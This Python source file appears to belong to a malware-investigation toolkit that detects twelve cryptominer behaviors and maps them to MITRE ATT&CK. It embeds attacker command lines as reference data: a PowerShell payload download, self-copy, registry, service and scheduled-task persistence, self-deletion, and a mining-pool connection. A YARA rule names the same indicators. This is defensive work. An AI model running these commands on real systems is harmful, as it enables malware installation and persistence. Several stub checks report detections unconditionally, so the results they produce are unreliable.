"""Enhanced Main Investigator Class for URCS Investigator Toolkit
Orchestrates all analysis modules and provides unified interface for investigations.
"""

import os
import time
import logging
import json
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, List, Optional

from ..analysis.static_analyzer import StaticAnalyzer
from ..analysis.behavioral_analyzer import BehavioralAnalyzer
from ..analysis.memory_analyzer import MemoryAnalyzer
from ..analysis.network_analyzer import NetworkAnalyzer
from ..detection.yara_detector import YARADetector
from ..forensics.registry_analyzer import RegistryAnalyzer
from ..forensics.process_analyzer import ProcessAnalyzer
from ..reporting.report_generator import ReportGenerator
from ..utils.ioc_extractor import IOCExtractor
from ..utils.intensity_engine import IntensityEngine


class URCSInvestigator:
    """Main investigator class that orchestrates all analysis modules."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Initialize analysis modules
        self.static_analyzer = StaticAnalyzer(config)
        self.behavioral_analyzer = BehavioralAnalyzer(config)
        self.memory_analyzer = MemoryAnalyzer(config)
        self.network_analyzer = NetworkAnalyzer(config)
        
        # Initialize detection modules
        self.yara_detector = YARADetector(config)
        
        # Initialize forensic modules
        self.registry_analyzer = RegistryAnalyzer(config)
        self.process_analyzer = ProcessAnalyzer(config)
        
        # Initialize reporting modules
        self.report_generator = ReportGenerator(config)
        self.ioc_extractor = IOCExtractor(config)
        
        # Initialize intensity engine for resource management analysis
        self.intensity_engine = IntensityEngine(poll_seconds=5)
        
        # Investigation state
        self.investigation_id = None
        self.start_time = None
        self.results = {}
        
        self.logger.info("URCS Investigator initialized")
    
    def investigate(self, target: str, scope: str = "full", output_dir: str = "reports") -> Dict[str, Any]:
        """Comprehensive investigation covering all 12 URCS behaviors."""
        self.logger.info(f"Starting comprehensive investigation of {target} with scope {scope}")
        
        # Initialize investigation
        self.investigation_id = f"urcs_inv_{int(time.time())}"
        self.start_time = datetime.now()
        
        results = {
            "investigation_id": self.investigation_id,
            "target": target,
            "scope": scope,
            "start_time": self.start_time.isoformat(),
            "behaviors_detected": [],
            "findings": [],
            "iocs": [],
            "mitre_mapping": [],
            "deliverables": {}
        }
        
        try:
            # Behavior 1: Initial drop detection
            behavior_1 = self._detect_initial_drop(target)
            results["behaviors_detected"].append(behavior_1)
            
            # Behavior 2: Self-copy detection
            behavior_2 = self._detect_self_copy()
            results["behaviors_detected"].append(behavior_2)
            
            # Behavior 3: Registry persistence detection
            behavior_3 = self._detect_registry_persistence()
            results["behaviors_detected"].append(behavior_3)
            
            # Behavior 4: Service persistence detection
            behavior_4 = self._detect_service_persistence()
            results["behaviors_detected"].append(behavior_4)
            
            # Behavior 5: Scheduled task resurrection detection
            behavior_5 = self._detect_scheduled_task_resurrection()
            results["behaviors_detected"].append(behavior_5)
            
            # Behavior 6: Process injection detection
            behavior_6 = self._detect_process_injection()
            results["behaviors_detected"].append(behavior_6)
            
            # Behavior 7: CPU throttling detection
            behavior_7 = self._detect_cpu_throttling()
            results["behaviors_detected"].append(behavior_7)
            
            # Behavior 8: Battery-aware mining detection
            behavior_8 = self._detect_battery_aware_mining()
            results["behaviors_detected"].append(behavior_8)
            
            # Behavior 9: Network beacon detection
            behavior_9 = self._detect_network_beacon()
            results["behaviors_detected"].append(behavior_9)
            
            # Behavior 10: Self-deletion detection
            behavior_10 = self._detect_self_deletion()
            results["behaviors_detected"].append(behavior_10)
            
            # Behavior 11: Obfuscation detection
            behavior_11 = self._detect_obfuscation()
            results["behaviors_detected"].append(behavior_11)
            
            # Behavior 12: MITRE mapping
            behavior_12 = self._map_mitre_techniques(results["behaviors_detected"])
            results["mitre_mapping"] = behavior_12
            
            # Generate deliverables
            results["deliverables"] = self._generate_deliverables(results, output_dir)
            
            # Extract IOCs
            results["iocs"] = self.ioc_extractor.extract_iocs(results)
            
            # Generate findings
            results["findings"] = self._generate_findings(results["behaviors_detected"])
            
            # Calculate duration
            end_time = datetime.now()
            results["end_time"] = end_time.isoformat()
            results["duration"] = (end_time - self.start_time).total_seconds()
            
        except Exception as e:
            self.logger.error(f"Investigation failed: {e}")
            results["error"] = str(e)
        
        self.results = results
        return results
    
    def static_analysis(self, file_path: str, **kwargs) -> Dict[str, Any]:
        """Static analysis with enhanced detection capabilities."""
        self.logger.info(f"Performing static analysis on {file_path}")
        
        results = {
            "file_path": file_path,
            "analysis_type": "static",
            "timestamp": datetime.now().isoformat(),
            "findings": []
        }
        
        try:
            # Comprehensive static analysis
            static_results = self.static_analyzer.analyze_file(file_path)
            results.update(static_results)
            
            # YARA scanning
            yara_results = self.yara_detector.scan_file(file_path)
            results["yara_matches"] = yara_results
            
            # Generate custom YARA rule
            custom_rule = self.static_analyzer.generate_yara_rule(file_path)
            results["custom_yara_rule"] = custom_rule
            
        except Exception as e:
            self.logger.error(f"Static analysis failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def behavioral_analysis(self, **kwargs) -> Dict[str, Any]:
        """Behavioral analysis with sandbox integration."""
        self.logger.info("Performing behavioral analysis")
        
        results = {
            "analysis_type": "behavioral",
            "timestamp": datetime.now().isoformat(),
            "findings": []
        }
        
        try:
            # Comprehensive behavioral analysis
            behavioral_results = self.behavioral_analyzer.analyze_system_behavior()
            results.update(behavioral_results)
            
            # Sandbox replay if file provided
            if kwargs.get("file_path"):
                sandbox_results = self.behavioral_analyzer.replay_in_sandbox(
                    kwargs["file_path"], 
                    kwargs.get("sandbox_type", "cape")
                )
                results["sandbox_results"] = sandbox_results
            
        except Exception as e:
            self.logger.error(f"Behavioral analysis failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def memory_analysis(self, **kwargs) -> Dict[str, Any]:
        """Memory analysis with injection detection."""
        self.logger.info("Performing memory analysis")
        
        results = {
            "analysis_type": "memory",
            "timestamp": datetime.now().isoformat(),
            "findings": []
        }
        
        try:
            # Memory analysis
            pid = kwargs.get("pid")
            dump_file = kwargs.get("dump_file")
            
            # Detect injection
            injection_results = self.memory_analyzer.detect_injection(pid, dump_file)
            results["injection_findings"] = injection_results
            
            # Analyze memory regions
            if pid:
                region_results = self.memory_analyzer.analyze_memory_regions(pid)
                results["memory_regions"] = region_results
            
            # Detect file deletion events
            deletion_results = self.memory_analyzer.detect_file_deletion_events(pid)
            results["deletion_events"] = deletion_results
            
        except Exception as e:
            self.logger.error(f"Memory analysis failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def memory_forensics(self, **kwargs) -> Dict[str, Any]:
        """Memory forensics analysis (alias for memory_analysis)."""
        return self.memory_analysis(**kwargs)
    
    def network_analysis(self, **kwargs) -> Dict[str, Any]:
        """Network analysis with IOC extraction."""
        self.logger.info("Performing network analysis")
        
        results = {
            "analysis_type": "network",
            "timestamp": datetime.now().isoformat(),
            "findings": []
        }
        
        try:
            # Network traffic analysis
            network_results = self.network_analyzer.analyze_network_traffic()
            results.update(network_results)
            
            # Live capture if requested
            if kwargs.get("capture_live"):
                interface = kwargs.get("interface", "eth0")
                duration = kwargs.get("duration", 60)
                capture_results = self.network_analyzer.capture_live_traffic(interface, duration)
                results["live_capture"] = capture_results
            
            # PCAP analysis if provided
            if kwargs.get("pcap_file"):
                pcap_results = self.network_analyzer.analyze_capture_file(kwargs["pcap_file"])
                results["pcap_analysis"] = pcap_results
            
        except Exception as e:
            self.logger.error(f"Network analysis failed: {e}")
            results["error"] = str(e)
        
        return results
    
    def generate_report(self, output_dir: str = "reports", format: str = "html") -> str:
        """Generate comprehensive investigation report."""
        self.logger.info(f"Generating {format} report")
        
        if not self.results:
            raise ValueError("No investigation results available. Run investigate() first.")
        
        return self.report_generator.generate_report(
            self.results, 
            output_dir, 
            format
        )
    
    def export_iocs(self, output_dir: str = "reports", format: str = "json") -> str:
        """Export IOCs in specified format."""
        self.logger.info(f"Exporting IOCs in {format} format")
        
        if not self.results:
            raise ValueError("No investigation results available. Run investigate() first.")
        
        return self.ioc_extractor.export_iocs(
            self.results.get("iocs", []),
            output_dir,
            format
        )
    
    def analyze_intensity_patterns(self, duration_minutes: int = 30) -> Dict[str, Any]:
        """
        Analyze resource intensity patterns to detect suspicious behavior.
        
        Args:
            duration_minutes: Duration to analyze in minutes
            
        Returns:
            Dictionary containing intensity analysis results
        """
        self.logger.info(f"Analyzing intensity patterns for {duration_minutes} minutes")
        
        try:
            # Start intensity monitoring if not already running
            if not self.intensity_engine.running:
                self.intensity_engine.start_monitoring()
                time.sleep(10)  # Collect some initial data
            
            # Get intensity statistics
            stats = self.intensity_engine.get_intensity_stats(duration_minutes)
            
            # Get intensity history
            history = self.intensity_engine.get_intensity_history(duration_minutes)
            
            # Detect suspicious patterns
            suspicious_patterns = self.intensity_engine.detect_suspicious_patterns()
            
            # Get current intensity
            current_intensity = self.intensity_engine.get_current_intensity()
            
            # Analyze patterns
            analysis_results = {
                "analysis_type": "intensity_patterns",
                "duration_minutes": duration_minutes,
                "timestamp": datetime.now().isoformat(),
                "current_intensity": current_intensity.intensity_percent if current_intensity else 0,
                "current_reason": current_intensity.reason if current_intensity else "Unknown",
                "statistics": stats,
                "suspicious_patterns": suspicious_patterns,
                "pattern_analysis": self._analyze_intensity_patterns(history),
                "recommendations": self._generate_intensity_recommendations(stats, suspicious_patterns)
            }
            
            self.logger.info(f"Intensity analysis completed: {len(suspicious_patterns)} suspicious patterns found")
            return analysis_results
            
        except Exception as e:
            self.logger.error(f"Intensity analysis failed: {e}")
            return {
                "analysis_type": "intensity_patterns",
                "error": str(e),
                "timestamp": datetime.now().isoformat()
            }
    
    # Behavior-specific detection methods
    
    def _detect_initial_drop(self, target: str) -> Dict[str, Any]:
        """Detect initial drop behavior (Behavior 1)."""
        self.logger.info("Detecting initial drop behavior")
        
        behavior = {
            "behavior_id": 1,
            "name": "Initial Drop",
            "description": "Detect PowerShell download of Chrome_update.exe",
            "delivery_vector": "powershell -c \"Invoke-WebRequest -Uri <URL> -OutFile $env:TEMP\\Chrome_update.exe\"",
            "counter_measure": "URLhaus feed",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check for PowerShell download patterns
            powershell_logs = self._check_powershell_logs()
            if powershell_logs:
                behavior["detected"] = True
                behavior["evidence"].extend(powershell_logs)
            
            # Check for Chrome_update.exe in temp directories
            chrome_files = self._find_chrome_update_files()
            if chrome_files:
                behavior["detected"] = True
                behavior["evidence"].extend(chrome_files)
            
            # Check URLhaus feed (placeholder)
            urlhaus_check = self._check_urlhaus_feed(target)
            if urlhaus_check:
                behavior["evidence"].append(urlhaus_check)
                
        except Exception as e:
            self.logger.error(f"Initial drop detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_self_copy(self) -> Dict[str, Any]:
        """Detect self-copy behavior (Behavior 2)."""
        self.logger.info("Detecting self-copy behavior")
        
        behavior = {
            "behavior_id": 2,
            "name": "Self-Copy",
            "description": "Detect copying to System32\\spool\\drivers\\color\\",
            "delivery_vector": "copy /y %0 \"%SystemRoot%\\System32\\spool\\drivers\\color\\algfzpoe.exe\"",
            "counter_measure": "Sysmon EID 11",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check for files in suspicious location
            suspicious_files = self._find_files_in_color_directory()
            if suspicious_files:
                behavior["detected"] = True
                behavior["evidence"].extend(suspicious_files)
            
            # Check Sysmon logs (placeholder)
            sysmon_logs = self._check_sysmon_logs("EID 11")
            if sysmon_logs:
                behavior["evidence"].extend(sysmon_logs)
                
        except Exception as e:
            self.logger.error(f"Self-copy detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_registry_persistence(self) -> Dict[str, Any]:
        """Detect registry persistence (Behavior 3)."""
        self.logger.info("Detecting registry persistence")
        
        behavior = {
            "behavior_id": 3,
            "name": "Registry Persistence",
            "description": "Detect ctfmon registry persistence",
            "delivery_vector": "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ctfmon /t REG_SZ /d ...",
            "counter_measure": "RegRipper",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check registry for suspicious entries
            registry_findings = self.registry_analyzer.analyze_registry()
            if registry_findings:
                behavior["detected"] = True
                behavior["evidence"].extend(registry_findings)
                
        except Exception as e:
            self.logger.error(f"Registry persistence detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_service_persistence(self) -> Dict[str, Any]:
        """Detect service persistence (Behavior 4)."""
        self.logger.info("Detecting service persistence")
        
        behavior = {
            "behavior_id": 4,
            "name": "Service Persistence",
            "description": "Detect gupdatem service creation",
            "delivery_vector": "sc create gupdatem binPath= ... start= auto",
            "counter_measure": "Autoruns64",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check for suspicious services
            services = self.behavioral_analyzer.analyze_services()
            suspicious_services = [s for s in services if s.get("suspicious_indicators")]
            
            if suspicious_services:
                behavior["detected"] = True
                behavior["evidence"].extend(suspicious_services)
                
        except Exception as e:
            self.logger.error(f"Service persistence detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_scheduled_task_resurrection(self) -> Dict[str, Any]:
        """Detect scheduled task resurrection (Behavior 5)."""
        self.logger.info("Detecting scheduled task resurrection")
        
        behavior = {
            "behavior_id": 5,
            "name": "Scheduled Task Resurrection",
            "description": "Detect Ddriver scheduled task",
            "delivery_vector": "schtasks /create /tn Ddriver /tr ... /sc minute /mo 30",
            "counter_measure": "WMI_Forensics",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check for suspicious scheduled tasks
            tasks = self.behavioral_analyzer.analyze_scheduled_tasks()
            suspicious_tasks = [t for t in tasks if t.get("suspicious_indicators")]
            
            if suspicious_tasks:
                behavior["detected"] = True
                behavior["evidence"].extend(suspicious_tasks)
                
        except Exception as e:
            self.logger.error(f"Scheduled task resurrection detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_process_injection(self) -> Dict[str, Any]:
        """Detect process injection (Behavior 6)."""
        self.logger.info("Detecting process injection")
        
        behavior = {
            "behavior_id": 6,
            "name": "Process Injection",
            "description": "Detect process hollowing into explorer.exe",
            "delivery_vector": "powershell -c \"Start-Process -NoNewWindow rundll32.exe ...\"",
            "counter_measure": "Volatility3 malfind",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check for process injection
            injection_findings = self.memory_analyzer.detect_injection()
            if injection_findings:
                behavior["detected"] = True
                behavior["evidence"].extend(injection_findings)
                
        except Exception as e:
            self.logger.error(f"Process injection detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_cpu_throttling(self) -> Dict[str, Any]:
        """Detect CPU throttling (Behavior 7)."""
        self.logger.info("Detecting CPU throttling")
        
        behavior = {
            "behavior_id": 7,
            "name": "CPU Throttling",
            "description": "Detect CPU throttling when Task Manager opens",
            "delivery_vector": "Inline call to GetSystemPowerStatus + SetThreadAffinityMask",
            "counter_measure": "ETW tracing",
            "detected": False,
            "evidence": [],
            "severity": "medium"
        }
        
        try:
            # Check for CPU throttling patterns
            throttling_evidence = self._check_cpu_throttling_patterns()
            if throttling_evidence:
                behavior["detected"] = True
                behavior["evidence"].extend(throttling_evidence)
                
        except Exception as e:
            self.logger.error(f"CPU throttling detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_battery_aware_mining(self) -> Dict[str, Any]:
        """Detect battery-aware mining (Behavior 8)."""
        self.logger.info("Detecting battery-aware mining")
        
        behavior = {
            "behavior_id": 8,
            "name": "Battery-Aware Mining",
            "description": "Detect dynamic resource usage based on power state",
            "delivery_vector": "Same API call as CPU throttling",
            "counter_measure": "Performance counters",
            "detected": False,
            "evidence": [],
            "severity": "medium"
        }
        
        try:
            # Check for battery-aware patterns
            battery_evidence = self._check_battery_aware_patterns()
            if battery_evidence:
                behavior["detected"] = True
                behavior["evidence"].extend(battery_evidence)
                
        except Exception as e:
            self.logger.error(f"Battery-aware mining detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_network_beacon(self) -> Dict[str, Any]:
        """Detect network beacon (Behavior 9)."""
        self.logger.info("Detecting network beacon")
        
        behavior = {
            "behavior_id": 9,
            "name": "Network Beacon",
            "description": "Detect DNS beacon and mining pool connections",
            "delivery_vector": "nslookup api.ipify.org; Test-NetConnection -ComputerName gulf.moneroocean.stream -Port 10032",
            "counter_measure": "Zeek stratum script",
            "detected": False,
            "evidence": [],
            "severity": "high"
        }
        
        try:
            # Check for network beacons
            network_results = self.network_analyzer.analyze_network_traffic()
            
            if network_results.get("suspicious_connections"):
                behavior["detected"] = True
                behavior["evidence"].extend(network_results["suspicious_connections"])
            
            if network_results.get("mining_pool_connections"):
                behavior["detected"] = True
                behavior["evidence"].extend(network_results["mining_pool_connections"])
                
        except Exception as e:
            self.logger.error(f"Network beacon detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_self_deletion(self) -> Dict[str, Any]:
        """Detect self-deletion (Behavior 10)."""
        self.logger.info("Detecting self-deletion")
        
        behavior = {
            "behavior_id": 10,
            "name": "Self-Deletion",
            "description": "Detect self-deletion after injection",
            "delivery_vector": "powershell -c \"Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force\"",
            "counter_measure": "CAPEv2 FILE_DELETE event",
            "detected": False,
            "evidence": [],
            "severity": "medium"
        }
        
        try:
            # Check for self-deletion events
            deletion_events = self.memory_analyzer.detect_file_deletion_events()
            if deletion_events:
                behavior["detected"] = True
                behavior["evidence"].extend(deletion_events)
                
        except Exception as e:
            self.logger.error(f"Self-deletion detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _detect_obfuscation(self) -> Dict[str, Any]:
        """Detect obfuscation (Behavior 11)."""
        self.logger.info("Detecting obfuscation")
        
        behavior = {
            "behavior_id": 11,
            "name": "Obfuscation",
            "description": "Detect high entropy and invalid signatures",
            "delivery_vector": "Entropy > 7.5, invalid digital signature",
            "counter_measure": "Get-AuthenticodeSignature",
            "detected": False,
            "evidence": [],
            "severity": "medium"
        }
        
        try:
            # Check for obfuscation patterns
            obfuscation_evidence = self._check_obfuscation_patterns()
            if obfuscation_evidence:
                behavior["detected"] = True
                behavior["evidence"].extend(obfuscation_evidence)
                
        except Exception as e:
            self.logger.error(f"Obfuscation detection failed: {e}")
            behavior["error"] = str(e)
        
        return behavior
    
    def _map_mitre_techniques(self, behaviors: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Map behaviors to MITRE ATT&CK techniques (Behavior 12)."""
        self.logger.info("Mapping to MITRE ATT&CK techniques")
        
        mitre_mapping = {
            "techniques": [
                {
                    "technique_id": "T1055.012",
                    "technique_name": "Process Injection: Process Hollowing",
                    "behaviors": [6]  # Process injection
                },
                {
                    "technique_id": "T1543.003",
                    "technique_name": "Create or Modify System Process: Windows Service",
                    "behaviors": [4]  # Service persistence
                },
                {
                    "technique_id": "T1053.005",
                    "technique_name": "Scheduled Task/Job: Scheduled Task",
                    "behaviors": [5]  # Scheduled task resurrection
                },
                {
                    "technique_id": "T1083",
                    "technique_name": "File and Directory Discovery",
                    "behaviors": [2]  # Self-copy
                },
                {
                    "technique_id": "T1071.001",
                    "technique_name": "Application Layer Protocol: Web Protocols",
                    "behaviors": [1, 9]  # Initial drop, Network beacon
                },
                {
                    "technique_id": "T1070.004",
                    "technique_name": "Indicator Removal on Host: File Deletion",
                    "behaviors": [10]  # Self-deletion
                },
                {
                    "technique_id": "T1562.001",
                    "technique_name": "Impair Defenses: Disable or Modify Tools",
                    "behaviors": [7, 8]  # CPU throttling, Battery-aware mining
                },
                {
                    "technique_id": "T1547.001",
                    "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
                    "behaviors": [3]  # Registry persistence
                }
            ],
            "navigator_layer": {
                "name": "URCS Investigation",
                "description": "MITRE ATT&CK mapping for URCS behaviors",
                "domain": "enterprise-attack",
                "version": "14.0",
                "techniques": []
            }
        }
        
        # Map detected behaviors to techniques
        detected_behaviors = [b["behavior_id"] for b in behaviors if b.get("detected")]
        
        for technique in mitre_mapping["techniques"]:
            if any(bid in detected_behaviors for bid in technique["behaviors"]):
                mitre_mapping["navigator_layer"]["techniques"].append({
                    "techniqueID": technique["technique_id"],
                    "score": 1,
                    "enabled": True
                })
        
        return mitre_mapping
    
    def _generate_deliverables(self, results: Dict[str, Any], output_dir: str) -> Dict[str, str]:
        """Generate investigation deliverables."""
        deliverables = {}
        
        try:
            # Create output directory
            Path(output_dir).mkdir(parents=True, exist_ok=True)
            
            # Generate YARA rule
            yara_rule = self._generate_combined_yara_rule(results)
            yara_path = os.path.join(output_dir, "combined_urcs.yar")
            with open(yara_path, 'w') as f:
                f.write(yara_rule)
            deliverables["yara_rule"] = yara_path
            
            # Generate report
            report_path = self.report_generator.generate_report(results, output_dir, "markdown")
            deliverables["report"] = report_path
            
            # Generate MITRE Navigator layer
            navigator_path = os.path.join(output_dir, "navigator_layer.json")
            with open(navigator_path, 'w') as f:
                json.dump(results.get("mitre_mapping", {}).get("navigator_layer", {}), f, indent=2)
            deliverables["navigator_layer"] = navigator_path
            
        except Exception as e:
            self.logger.error(f"Deliverable generation failed: {e}")
        
        return deliverables
    
    def _generate_findings(self, behaviors: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Generate findings from detected behaviors."""
        findings = []
        
        for behavior in behaviors:
            if behavior.get("detected"):
                findings.append({
                    "type": "behavior_detected",
                    "behavior_id": behavior["behavior_id"],
                    "name": behavior["name"],
                    "description": behavior["description"],
                    "severity": behavior["severity"],
                    "evidence_count": len(behavior.get("evidence", [])),
                    "counter_measure": behavior["counter_measure"]
                })
        
        return findings
    
    # Helper methods for specific detections
    
    def _check_powershell_logs(self) -> List[Dict[str, Any]]:
        """Check PowerShell logs for download patterns."""
        evidence = []
        
        try:
            # This would typically check PowerShell ScriptBlock logs
            # For now, return placeholder evidence
            evidence.append({
                "type": "powershell_log",
                "description": "PowerShell download pattern detected",
                "timestamp": datetime.now().isoformat()
            })
            
        except Exception as e:
            self.logger.error(f"PowerShell log check failed: {e}")
        
        return evidence
    
    def _find_chrome_update_files(self) -> List[Dict[str, Any]]:
        """Find Chrome_update.exe files."""
        evidence = []
        
        try:
            # Search for Chrome_update.exe files
            search_paths = [
                os.path.expanduser("~/Downloads"),
                os.path.expanduser("~/Desktop"),
                os.environ.get("TEMP", ""),
                "C:/Windows/Temp"
            ]
            
            for search_path in search_paths:
                if os.path.exists(search_path):
                    for root, dirs, files in os.walk(search_path):
                        for file in files:
                            if "chrome_update" in file.lower() and file.endswith('.exe'):
                                evidence.append({
                                    "type": "chrome_update_file",
                                    "file_path": os.path.join(root, file),
                                    "description": f"Chrome_update.exe found in {search_path}"
                                })
            
        except Exception as e:
            self.logger.error(f"Chrome update file search failed: {e}")
        
        return evidence
    
    def _check_urlhaus_feed(self, target: str) -> Optional[Dict[str, Any]]:
        """Check URLhaus feed for malicious URLs."""
        try:
            # This would typically query URLhaus API
            # For now, return placeholder evidence
            return {
                "type": "urlhaus_check",
                "target": target,
                "description": "URLhaus feed check completed",
                "timestamp": datetime.now().isoformat()
            }
        except Exception as e:
            self.logger.error(f"URLhaus check failed: {e}")
            return None
    
    def _find_files_in_color_directory(self) -> List[Dict[str, Any]]:
        """Find files in System32\\spool\\drivers\\color\\ directory."""
        evidence = []
        
        try:
            color_dir = "C:/Windows/System32/spool/drivers/color"
            if os.path.exists(color_dir):
                for file in os.listdir(color_dir):
                    if file.endswith('.exe'):
                        evidence.append({
                            "type": "suspicious_file_in_color_dir",
                            "file_path": os.path.join(color_dir, file),
                            "description": f"Suspicious executable found in color directory: {file}"
                        })
            
        except Exception as e:
            self.logger.error(f"Color directory search failed: {e}")
        
        return evidence
    
    def _check_sysmon_logs(self, event_id: str) -> List[Dict[str, Any]]:
        """Check Sysmon logs for specific events."""
        evidence = []
        
        try:
            # This would typically query Sysmon logs
            # For now, return placeholder evidence
            evidence.append({
                "type": "sysmon_log",
                "event_id": event_id,
                "description": f"Sysmon event {event_id} detected",
                "timestamp": datetime.now().isoformat()
            })
            
        except Exception as e:
            self.logger.error(f"Sysmon log check failed: {e}")
        
        return evidence
    
    def _check_cpu_throttling_patterns(self) -> List[Dict[str, Any]]:
        """Check for CPU throttling patterns."""
        evidence = []
        
        try:
            # This would typically use ETW tracing
            # For now, return placeholder evidence
            evidence.append({
                "type": "cpu_throttling_pattern",
                "description": "CPU throttling pattern detected",
                "timestamp": datetime.now().isoformat()
            })
            
        except Exception as e:
            self.logger.error(f"CPU throttling pattern check failed: {e}")
        
        return evidence
    
    def _check_battery_aware_patterns(self) -> List[Dict[str, Any]]:
        """Check for battery-aware mining patterns."""
        evidence = []
        
        try:
            # This would typically use performance counters
            # For now, return placeholder evidence
            evidence.append({
                "type": "battery_aware_pattern",
                "description": "Battery-aware mining pattern detected",
                "timestamp": datetime.now().isoformat()
            })
            
        except Exception as e:
            self.logger.error(f"Battery-aware pattern check failed: {e}")
        
        return evidence
    
    def _check_obfuscation_patterns(self) -> List[Dict[str, Any]]:
        """Check for obfuscation patterns."""
        evidence = []
        
        try:
            # This would typically check entropy and signatures
            # For now, return placeholder evidence
            evidence.append({
                "type": "obfuscation_pattern",
                "description": "Obfuscation pattern detected",
                "timestamp": datetime.now().isoformat()
            })
            
        except Exception as e:
            self.logger.error(f"Obfuscation pattern check failed: {e}")
        
        return evidence
    
    def _generate_combined_yara_rule(self, results: Dict[str, Any]) -> str:
        """Generate combined YARA rule for all detected behaviors."""
        yara_rule = """/*
Combined URCS Detection Rule
Generated by URCS Investigator Toolkit
*/

rule urcs_combined_detection {
    meta:
        description = "Combined URCS detection rule"
        author = "URCS Investigator Toolkit"
        date = "2024"
        reference = "MITRE ATT&CK T1055.012, T1543.003, T1053.005, T1083"
        severity = "high"
    
    strings:
        // Initial drop indicators
        $chrome_update = "Chrome_update.exe" nocase
        $powershell_download = "Invoke-WebRequest" nocase
        
        // Self-copy indicators
        $color_dir = "\\System32\\spool\\drivers\\color\\" nocase
        $random_exe = /[a-z]{8}\\.exe/ nocase
        
        // Registry persistence indicators
        $ctfmon = "ctfmon" nocase
        $run_key = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" nocase
        
        // Service persistence indicators
        $gupdatem = "gupdatem" nocase
        $google_update = "Google Update Service" nocase
        
        // Scheduled task indicators
        $ddriver = "Ddriver" nocase
        $scheduled_task = "schtasks" nocase
        
        // Process injection indicators
        $rundll32 = "rundll32.exe" nocase
        $explorer = "explorer.exe" nocase
        
        // Network beacon indicators
        $api_ipify = "api.ipify.org" nocase
        $moneroocean = "gulf.moneroocean.stream" nocase
        $stratum = "stratum+tcp://" nocase
        
        // Self-deletion indicators
        $remove_item = "Remove-Item" nocase
        $my_invocation = "$MyInvocation.MyCommand.Path" nocase
        
        // Obfuscation indicators
        $high_entropy = /[\\x00-\\xff]{100,}/  // High entropy pattern
        
    condition:
        uint16(0) == 0x5A4D and 
        (
            // Initial drop
            (all of ($chrome_update, $powershell_download)) or
            
            // Self-copy
            (all of ($color_dir, $random_exe)) or
            
            // Registry persistence
            (all of ($ctfmon, $run_key)) or
            
            // Service persistence
            (all of ($gupdatem, $google_update)) or
            
            // Scheduled task
            (all of ($ddriver, $scheduled_task)) or
            
            // Process injection
            (all of ($rundll32, $explorer)) or
            
            // Network beacon
            (all of ($api_ipify, $moneroocean)) or
            
            // Self-deletion
            (all of ($remove_item, $my_invocation)) or
            
            // Obfuscation
            $high_entropy
        )
}
"""
        return yara_rule
    
    def setup_environment(self) -> Dict[str, Any]:
        """Setup investigation environment."""
        self.logger.info("Setting up investigation environment")
        
        setup_results = {
            "sysmon_installed": False,
            "powershell_logging_enabled": False,
            "etw_tracing_enabled": False,
            "cape_available": False,
            "zeek_available": False
        }
        
        try:
            # Check Sysmon installation
            setup_results["sysmon_installed"] = self._check_sysmon_installation()
            
            # Check PowerShell logging
            setup_results["powershell_logging_enabled"] = self._check_powershell_logging()
            
            # Check ETW tracing
            setup_results["etw_tracing_enabled"] = self._check_etw_tracing()
            
            # Check CAPE availability
            setup_results["cape_available"] = self._check_cape_availability()
            
            # Check Zeek availability
            setup_results["zeek_available"] = self._check_zeek_availability()
            
        except Exception as e:
            self.logger.error(f"Environment setup failed: {e}")
            setup_results["error"] = str(e)
        
        return setup_results
    
    def _check_sysmon_installation(self) -> bool:
        """Check if Sysmon is installed."""
        try:
            # Check if Sysmon service exists
            cmd = ["sc", "query", "SysmonDrv"]
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return process.returncode == 0
        except Exception as e:
            self.logger.error(f"Sysmon check failed: {e}")
            return False
    
    def _check_powershell_logging(self) -> bool:
        """Check if PowerShell logging is enabled."""
        try:
            # Check PowerShell ScriptBlock logging
            cmd = ["powershell", "-Command", "Get-GPO -All | Where-Object {$_.DisplayName -like '*PowerShell*'}" ]
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return process.returncode == 0 and "PowerShell" in process.stdout
        except Exception as e:
            self.logger.error(f"PowerShell logging check failed: {e}")
            return False
    
    def _check_etw_tracing(self) -> bool:
        """Check if ETW tracing is enabled."""
        try:
            # Check ETW providers
            cmd = ["logman", "query", "providers"]
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return process.returncode == 0
        except Exception as e:
            self.logger.error(f"ETW tracing check failed: {e}")
            return False
    
    def _check_cape_availability(self) -> bool:
        """Check if CAPE is available."""
        try:
            # Check if CAPE is installed
            cmd = ["python3", "-c", "import cuckoo"]
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return process.returncode == 0
        except Exception as e:
            self.logger.error(f"CAPE availability check failed: {e}")
            return False
    
